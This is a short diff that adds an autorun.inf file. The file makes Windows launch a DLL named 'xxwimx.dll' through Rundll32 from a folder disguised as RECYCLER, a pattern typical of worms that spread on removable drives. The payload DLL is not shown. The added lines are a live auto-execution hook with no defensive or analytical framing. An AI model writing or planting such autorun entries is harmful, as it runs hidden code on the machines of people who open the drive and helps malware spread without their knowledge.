@@ -1,0 +1,2 @@
+[autorun]
+Open=Rundll32.exe .\RECYCLER\xxwimx.dll,Setup
